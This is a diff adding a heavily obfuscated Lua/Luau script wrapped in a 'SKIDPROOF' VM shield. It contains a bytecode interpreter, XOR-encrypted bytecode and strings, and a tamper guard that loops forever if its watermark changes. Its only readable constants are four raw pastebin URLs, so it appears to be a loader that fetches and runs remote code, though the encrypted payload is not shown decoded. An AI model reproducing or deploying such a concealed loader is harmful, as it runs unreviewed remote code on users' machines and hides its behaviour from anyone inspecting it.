@@ -1,0 +1,309 @@
+-- [ SHIELD: SENTINAL ]
+-- [ MODE: VM SHIELD ]
+-- [ ENGINE: CLASSIC ]
+-- [ TIMESTAMP: 2026. 10. 12. ]
+
+--[[SKIDPROOF:{"version":1,"watermark":{"buildId":"sp_mv436evq_j2g8ta","customerId":"LOCAL-PRIVATE","preset":"maxCover_VM","backend":"classic","fingerprint":"8b845d63","createdAt":"2026-10-11T17:17:45.302Z"},"features":["virtualize"],"outputHash":"d9b648fa","transformHash":"ede309be","productMode":"local-app","integrityPolicy":"warn","manifestHash":"e62876b4"}]]
+local __sp_guard_8b84={b="sp_mv436evq_j2g8ta",f="8b845d63"};if __sp_guard_8b84.b~="sp_mv436evq_j2g8ta" or __sp_guard_8b84.f~="8b845d63" then while true do end end;
+local _0x08c6c452 = {1,0,2,0,3,4,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,8,9,10,11}
+local _0x8c99a8ce = buffer.fromstring("\065\019\100\178\065\019\096\178\065\019\104\038\064\019\116\038\069\021\096\050\067\019\104\038\066\019\116\038\069\021\096\050\069\019\104\038\074\019\102\170\068\019\096\026\071\019\124\026\070\019\120\038\070\031\104\058\073\019\112\038\067\021\104\118\066\019\108\022\067\023\096\118\064\019\100\022\067\017\100\118\065\019\100\022\064\019\100\130\179\236\117\078\069\021\096\050\072\019\108\038\064\023\100\050\065\019\096\178\065\019\104\038\075\019\116\038\069\021\096\050\067\019\104\038\074\019\116\038\069\021\096\050\069\019\104\038\074\019\102\170\068\019\096\026\071\019\124\026\070\019\120\038\070\031\104\058\077\019\112\038\067\021\104\118\066\019\108\022\067\023\096\118\064\019\100\022\067\017\100\118\065\019\100\022\064\019\100\130\179\236\117\078\069\021\096\050\076\019\108\038\064\023\100\050\065\019\096\178\065\019\104\038\079\019\116\038\069\021\096\050\067\019\104\038\065\019\116\178\078\019\112\038\072\019\124\038\068\031\116\050\081\019\112\038\076\019\124\038\068\031\116\050\069\021\096\050\069\019\104\038\074\019\102\170\068\019\096\026\071\019\124\026\070\019\120\038\070\031\104\058\080\019\112\038\067\021\104\118\066\019\108\022\067\023\096\118\064\019\100\022\067\017\100\118\065\019\100\022\064\019\100\130\179\236\117\078\069\021\096\050\083\019\108\038\064\023\100\050\065\019\096\178\065\019\104\038\082\019\116\038\069\021\096\050\067\019\104\038\085\019\116\038\069\021\096\050\069\019\104\038\074\019\102\170\068\019\096\026\071\019\124\026\070\019\120\038\070\031\104\058\084\019\112\038\067\021\104\118\066\019\108\022\067\023\096\118\064\019\100\022\067\017\100\118\065\019\100\022\064\019\100\130\179\236\117\078\069\021\096\050\087\019\108\038\064\023\100\050\065\019\096\022\086\019\112\026\064\019\124\022\069\023\112\118\068\019\108\022\071\019\104\022\070\019\116\022\067\019\120\022\066\019\068\022\069\019\064\022\066\021\120\118\070\019\116\022\022\019\118\174\070\019\112\022\073\019\124\022\071\019\080\022\065\019\092\038\079\009\072\070\071\019\080\026\065\019\092\038\079\009\084\070\077\005\096\018\064\019\102\170\089\019\076\038\065\019\102\170\088\019\076\038\075\019\072\022\088\019\084\038\077\019\080\022\091\019\032\026\071\019\040\022\067\019\052\038\085\053\044\070\067\023\032\118\080\019\088\022\090\019\036\038\081\013\096\018\064\019\102\170\089\019\092\038\065\019\102\170\088\019\092\038\095\019\094\174\086\019\044\026\071\019\052\022\067\019\048\038\084\059\040\070\069\023\044\118\083\019\088\022\082\019\036\022\085\019\032\022\078\019\052\022\081\019\048\022\080\019\060\022\066\021\052\118\085\019\032\022\078\019\034\174\085\019\044\022\084\019\040\022\082\019\004\022\071\019\012\026\067\019\008\038\090\039\000\070\088\035\096\018\064\019\102\170\089\019\056\038\065\019\102\170\088\019\056\038\067\019\058\174\089\019\004\038\089\019\080\022\065\019\102\170\168\236\101\170\074\019\102\170\071\019\032\022\067\019\044\038\083\049\088\070\071\019\032\026\067\019\044\038\083\049\036\070\081\013\096\018\064\019\102\170\089\019\092\038\065\019\102\170\088\019\092\038\079\019\080\022\074\019\088\022\064\019\090\174\076\019\092\022\065\019\102\170\078\019\092\022\073\019\094\174\092\019\032\026\093\019\044\038\083\049\088\070\071\019\032\022\069\019\044\038\083\049\036\070\067\023\088\118\078\019\088\022\065\019\102\170\224\236\101\170\065\019\100\130\065\019\100\186")
+local _0xb7398aa6 = {10,10,1,10,10,1,11,15,15,1,10,10,1}
+local _0x173d1042 = {6,7,6,10,4,7,6,4,5,5,4}
+local _0xd5a316ba = 27
+local _0x120ec4e7 = {}
+local _0xf7d22564 = {0,1,0,2,0,0,0,0,0,3,4,5,0,6,7,8,9,0,10,11,12,0,13,0,0,0,0,0,0,0}
+local _0xd3b3b422 = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}
+local _0x9f82667d = {0,6,13,19,29,33,40,46,50,55,60}
+local _0x5d309eaf = 63
+local _0x5ed08de8 = buffer.fromstring("\079\254\249\240\132\114\142\101\143\099\181\125\241\136\114\139\097\136\126\224\175\157\100\141\124\250\225\139\097\142\098\246\131\119\251\244\245\240\139\103\240\227\211\140\102\141\098\245\253\255\237\225\241\194\142\096\140\101\254\226\246\242\248\230\249\237\239\237\053\115\136\097\142\110\229\250\226\243\245\225\252\233\235\038\021\112\246\242\246\249\224\247\248\224\014\105\240\247\255\237\234\231\253\235\124")
+local _0xa4ca3952 = 107
+local _0xa9a9d836 = buffer.fromstring("\107\249\254\241\192\042\109\192\014\226\013\050\208\029\013\013\248\255\225\051\249\245\235\242\015\225\023\206\029\023\237\018\253\201\036\015\226\058\164\004\251\228\225\003\005\244\215\251\246\227\192\028\193\003\027\182\245\228\002\234\162\226\002\235")
+local _0x9bc4fe5c = {0,0,0,0,0,0,0,0,1,0,0,0,2,0,0,0,0,3,0,0,0,4,0,0,5,6,0,0,0,0}
+local _0xb2668968 = buffer.fromstring("")
+local _0xba2cc838 = {"https://pastebin.com/raw/kcpwqG9x","https://pastebin.com/raw/3s0QeQTH","https://pastebin.com/raw/8KqR9T36","https://pastebin.com/raw/zLfqW7Rb",true,false}
+local _0x18bbcb71 = {}
+local _0xbad89a27 = {0,10,20,21,31,41,42,53,68,83,84,94,104}
+
+local function _0x82036afd(_0x40da989c, ...)
+  local _0x98164e4e, _0x16c82ddc, _0xcc4a8a85, _0x878dbcba, _0xa35ac3d1, _0xdbfe19fe, _0xc336d377, _0x0f36aa2f, _0x47568516 = _0x40da989c[11], _0x40da989c[15], _0x40da989c[2], _0x40da989c[14], _0x40da989c[6], _0x40da989c[10], _0x40da989c[7], _0x40da989c[17], _0x40da989c[5]
+  local _0xdabbab25, _0x0ee81326, _0x3b0e89de, _0x1dc7f850, _0xa35a450b, _0x815ffa7f, _0xb8d53b35, _0xe51d5fb9, _0x0ecfa2a6, _0x76682b3b = _0x40da989c[12], _0x40da989c[8], _0x40da989c[13], _0x40da989c[1], _0x40da989c[3], _0x40da989c[4], _0x40da989c[19], _0x40da989c[16], _0x40da989c[9], _0x40da989c[18]
+  local _0xdfbc1be3 = getfenv()
+  local _0x60f81cbb = _G
+  local _0x214245da, _0x95cd8be8, _0xc9e144fa, _0x272b32f6, _0xc7f7bc52, _0xcce578a9, _0xe280ece3, _0x5fc0197e
+  _0x272b32f6 = function(index)
+    local _0x024c3942 = _0x47568516[index]
+    if _0x024c3942 and _0x024c3942 ~= 0 then
+      return _0x214245da(_0x47568516, _0x024c3942, _0xdabbab25, _0x0ee81326, _0x3b0e89de, _0x1dc7f850, false)
+    end
+    return nil
+  end
+  _0xe280ece3 = function(name, value)
+    _0xdfbc1be3[name] = value; _0x60f81cbb[name] = value
+  end
+  _0x95cd8be8 = function(index)
+    local _0xd9638f43 = _0x16c82ddc[index]
+    if _0xd9638f43 and _0xd9638f43 ~= 0 then
+      return _0xcc4a8a85[_0xd9638f43]
+    end
+    local _0x3dff1548 = _0x272b32f6(index)
+    if _0x3dff1548 ~= nil then
+      return _0x3dff1548
+    end
+    local _0x3dff1548 = _0xc7f7bc52(index)
+    if _0x3dff1548 ~= nil then
+      return _0x3dff1548
+    end
+    local _0x3dff1548 = _0xc9e144fa(index)
+    if _0x3dff1548 ~= nil then
+      return _0x3dff1548
+    end
+    return nil
+  end
+  _0xc9e144fa = function(index)
+    local _0x7a13e9aa = _0x878dbcba[index]
+    if _0x7a13e9aa and _0x7a13e9aa ~= 0 then
+      return _0x214245da(_0x878dbcba, _0x7a13e9aa, _0xa35ac3d1, _0xdbfe19fe, _0xc336d377, _0x0f36aa2f, false)
+    end
+    return nil
+  end
+  _0xcce578a9 = function(name)
+    return _0xdfbc1be3[name] ~= nil and _0xdfbc1be3[name] or _0x60f81cbb[name]
+  end
+  _0x214245da = function(_, ref, data_buffer, offsets, lengths, rolling_seed, numeric)
+    if not ref or ref == 0 then return nil end
+    local _0x619f087f = offsets[ref]
+    local _0x4dabf8e0 = lengths[ref]
+    local _0x11b70c7b = (rolling_seed + (ref * 17)) % 256
+    local _0x886d15a8 = {}
+    for pos = 0, _0x4dabf8e0 - 1 do
+      local enc = buffer.readu8(data_buffer, _0x619f087f + pos)
+      local byte = bit32.bxor(enc, _0x11b70c7b)
+      _0x886d15a8[pos + 1] = string.char(byte)
+      _0x11b70c7b = (_0x11b70c7b + enc + pos + ref) % 256
+    end
+    local _0x3dff1548 = table.concat(_0x886d15a8)
+    if numeric then
+      _0x3dff1548 = tonumber(_0x3dff1548)
+    end
+    return _0x3dff1548
+  end
+  _0x5fc0197e = function(start_ip, init_stack, local_u, b, varargs)
+    b = b or _0x98164e4e
+    local ip, stack, u = start_ip or 0, init_stack or {}, local_u or {regs=getfenv(), parent=nil}
+    varargs = varargs or {}
+    local _0x2901f475 = {
+      [18] = function()
+        if not (not stack[a+1] == (c_val ~= 0)) then ip = ip + 4 end
+      end,
+      [42] = function()
+        local payload = bit32.band(i, 0x3FFFF); local keyRef = bit32.rshift(payload, 6); local argCount = bit32.band(bit32.rshift(payload, 3), 0x7); local retCount = bit32.band(payload, 0x7); local t = stack[a+1]; local key = _0x95cd8be8(keyRef + 1); local f = t[key]; key = nil;
+      if retCount <= 0 then
+        if argCount <= 0 then f() else f(unpack(stack, a+2, a+1+argCount)) end
+      elseif retCount == 1 then
+        stack[a+1] = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount))
+      elseif retCount == 2 then
+        local r1, r2 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2
+      elseif retCount == 3 then
+        local r1, r2, r3 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3
+      elseif retCount == 4 then
+        local r1, r2, r3, r4 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4
+      elseif retCount == 5 then
+        local r1, r2, r3, r4, r5 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5
+      elseif retCount == 6 then
+        local r1, r2, r3, r4, r5, r6 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6
+      elseif retCount == 7 then
+        local r1, r2, r3, r4, r5, r6, r7 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6; stack[a+7] = r7
+      end
+      end,
+      [14] = function()
+        local name = _0x95cd8be8(bit32.band(i, 0x3FFFF) + 1); stack[a+1] = _0xcce578a9(name); name = nil
+      end,
+      [12] = function()
+        if (stack[b_val+1] == stack[c_val+1]) == (a ~= 0) then ip = ip + 4 end
+      end,
+      [16] = function()
+        stack[a+1] = varargs[b_val+1]
+      end,
+      [38] = function()
+        ip = buffer.len(b)
+      end,
+      [30] = function()
+        if stack[a+1] then ip = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4) end
+      end,
+      [31] = function()
+        stack[a+1] = stack[b_val+1] and stack[c_val+1]
+      end,
+      [8] = function()
+        stack[a+1] = (stack[b_val+1] or 0) + (stack[c_val+1] or 0)
+      end,
+      [32] = function()
+        local ptr = u; for _=1,b_val do ptr = ptr.parent or ptr end; stack[a+1] = ptr.regs[c_val+1]
+      end,
+      [15] = function()
+        stack[a+1] = (stack[b_val+1] or 0) * (stack[c_val+1] or 0)
+      end,
+      [17] = function()
+        local target = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4); local snap = {};
+              for idx, value in pairs(stack) do snap[idx] = value end
+              local my_env = {regs = snap, parent = u};
+              stack[a+1] = function(...) return _0x5fc0197e(target, {...}, my_env, b, ...) end
+      end,
+      [22] = function()
+        stack[a+1] = (stack[b_val+1] or 0) ^ (stack[c_val+1] or 0)
+      end,
+      [29] = function()
+        do end
+      end,
+      [43] = function()
+        stack[a+1] = (stack[b_val+1] or 0) - (stack[c_val+1] or 0)
+      end,
+      [19] = function()
+        stack[a+1] = (stack[b_val+1] or 0) % (stack[c_val+1] or 1)
+      end,
+      [13] = function()
+        stack[a+1] = stack[bit32.band(i, 0x3FFFF) + 1]
+      end,
+      [25] = function()
+        stack[a+1] = stack[b_val+1][stack[c_val+1]]
+      end,
+      [7] = function()
+        if (stack[b_val+1] >= stack[c_val+1]) == (a ~= 0) then ip = ip + 4 end
+      end,
+      [20] = function()
+        local s = ''; for j = b_val+1, c_val+1 do s = s .. tostring(stack[j] or '') end; stack[a+1] = s
+      end,
+      [37] = function()
+        local ptr = u; for _=1,b_val do ptr = ptr.parent or ptr end; ptr.regs[c_val+1] = stack[a+1]
+      end,
+      [10] = function()
+        if (stack[b_val+1] > stack[c_val+1]) == (a ~= 0) then ip = ip + 4 end
+      end,
+      [35] = function()
+        if not stack[a+1] then ip = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4) end
+      end,
+      [26] = function()
+        stack[a+1] = (stack[b_val+1] or 0) / (stack[c_val+1] or 1)
+      end,
+      [24] = function()
+        stack[a+1] = stack[b_val+1] or stack[c_val+1]
+      end,
+      [4] = function()
+        stack[a+1][stack[b_val+1]] = stack[c_val+1]
+      end,
+      [21] = function()
+        local f = stack[a+1]; if b_val <= 1 then
+             if c_val <= 1 then f()
+             elseif c_val == 2 then stack[a+1] = f()
+             elseif c_val == 3 then local r1, r2 = f(); stack[a+1] = r1; stack[a+2] = r2
+             elseif c_val == 4 then local r1, r2, r3 = f(); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3
+             elseif c_val == 5 then local r1, r2, r3, r4 = f(); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4
+             elseif c_val == 6 then local r1, r2, r3, r4, r5 = f(); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5
+             elseif c_val == 7 then local r1, r2, r3, r4, r5, r6 = f(); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6
+             elseif c_val == 8 then local r1, r2, r3, r4, r5, r6, r7 = f(); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6; stack[a+7] = r7
+             end
+           else
+             if c_val <= 1 then f(unpack(stack, a+2, a+b_val))
+             elseif c_val == 2 then stack[a+1] = f(unpack(stack, a+2, a+b_val))
+             elseif c_val == 3 then local r1, r2 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2
+             elseif c_val == 4 then local r1, r2, r3 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3
+             elseif c_val == 5 then local r1, r2, r3, r4 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4
+             elseif c_val == 6 then local r1, r2, r3, r4, r5 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5
+             elseif c_val == 7 then local r1, r2, r3, r4, r5, r6 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6
+             elseif c_val == 8 then local r1, r2, r3, r4, r5, r6, r7 = f(unpack(stack, a+2, a+b_val)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6; stack[a+7] = r7
+             end
+           end
+      end,
+      [27] = function()
+        local target = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4); local my_env = {regs = stack, parent = u};
+              stack[a+1] = function(...) return _0x5fc0197e(target, {...}, my_env, b, ...) end
+      end,
+      [11] = function()
+        local name = _0x95cd8be8(bit32.band(i, 0x3FFFF) + 1); _0xe280ece3(name, stack[a+1]); name = nil
+      end,
+      [0] = function()
+        stack[a+1] = (stack[a+1] or 0) - (stack[a+3] or 1); ip = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4)
+      end,
+      [40] = function()
+        local b_ret = bit32.band(i, 0x3FFFF); if b_ret == 0 then return unpack(stack, a+1, #stack) elseif b_ret <= 1 then return end; return unpack(stack, a+1, a+b_ret-1)
+      end,
+      [6] = function()
+        local t = stack[b_val+1]; stack[a+2] = t; stack[a+1] = t[stack[c_val+1]]
+      end,
+      [9] = function()
+        if (stack[b_val+1] < stack[c_val+1]) == (a ~= 0) then ip = ip + 4 end
+      end,
+      [33] = function()
+        local payload = bit32.band(i, 0x3FFFF); local nameRef = bit32.rshift(payload, 6); local argCount = bit32.band(bit32.rshift(payload, 3), 0x7); local retCount = bit32.band(payload, 0x7); local name = _0x95cd8be8(nameRef + 1); local f = _0xcce578a9(name); name = nil;
+      if retCount <= 0 then
+        if argCount <= 0 then f() else f(unpack(stack, a+2, a+1+argCount)) end
+      elseif retCount == 1 then
+        stack[a+1] = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount))
+      elseif retCount == 2 then
+        local r1, r2 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2
+      elseif retCount == 3 then
+        local r1, r2, r3 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3
+      elseif retCount == 4 then
+        local r1, r2, r3, r4 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4
+      elseif retCount == 5 then
+        local r1, r2, r3, r4, r5 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5
+      elseif retCount == 6 then
+        local r1, r2, r3, r4, r5, r6 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6
+      elseif retCount == 7 then
+        local r1, r2, r3, r4, r5, r6, r7 = argCount <= 0 and f() or f(unpack(stack, a+2, a+1+argCount)); stack[a+1] = r1; stack[a+2] = r2; stack[a+3] = r3; stack[a+4] = r4; stack[a+5] = r5; stack[a+6] = r6; stack[a+7] = r7
+      end
+      end,
+      [34] = function()
+        ip = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4)
+      end,
+      [23] = function()
+        if (stack[b_val+1] <= stack[c_val+1]) == (a ~= 0) then ip = ip + 4 end
+      end,
+      [2] = function()
+        stack[a+1] = #stack[b_val+1]
+      end,
+      [1] = function()
+        stack[a+1] = _0x95cd8be8(bit32.band(i, 0x3FFFF) + 1)
+      end,
+      [3] = function()
+        local step = stack[a+3] or 1; stack[a+1] = stack[a+1] + step; if (step > 0 and stack[a+1] <= stack[a+2]) or (step <= 0 and stack[a+1] >= stack[a+2]) then ip = ip + ((bit32.band(i, 0x3FFFF) - 0x1FFFF) * 4); stack[a+4] = stack[a+1] end
+      end,
+      [5] = function()
+        stack[a+1] = -stack[b_val+1]
+      end,
+      [36] = function()
+        stack[a+1] = {}
+      end,
+      [39] = function()
+        stack[a+1] = not stack[b_val+1]
+      end,
+      [41] = function()
+        do end
+      end,
+      [28] = function()
+        do end
+      end
+    }
+    while ip < buffer.len(b) do
+      local encrypted = buffer.readu32(b, ip)
+      local i = bit32.bxor(encrypted, _0x76682b3b)
+      ip = ip + 4
+      local op = bit32.rshift(i, 26)
+      local a = bit32.band(bit32.rshift(i, 18), 0xFF)
+      local b_val = bit32.band(bit32.rshift(i, 9), 0x1FF)
+      local c_val = bit32.band(i, 0x1FF)
+      local handler = _0x2901f475[op]
+      if handler then handler() end
+    end
+  end
+  _0xc7f7bc52 = function(index)
+    local _0x5c5fce48 = _0xa35a450b[index]
+    if _0x5c5fce48 and _0x5c5fce48 ~= 0 then
+      return _0x214245da(_0xa35a450b, _0x5c5fce48, _0x815ffa7f, _0xb8d53b35, _0xe51d5fb9, _0x0ecfa2a6, true)
+    end
+    return nil
+  end
+  return _0x5fc0197e(nil, nil, nil, _0x98164e4e, {n=select("#", ...), ...})
+end
+
+local _0x40da989c = {_0x5d309eaf,_0xba2cc838,_0xf7d22564,_0x5ed08de8,_0xd3b3b422,_0xa9a9d836,_0x173d1042,_0x120ec4e7,_0xa4ca3952,_0x9f82667d,_0x8c99a8ce,_0xb2668968,_0x18bbcb71,_0x08c6c452,_0x9bc4fe5c,_0xb7398aa6,_0xd5a316ba,576983873,_0xbad89a27}
+return _0x82036afd(_0x40da989c, ...)
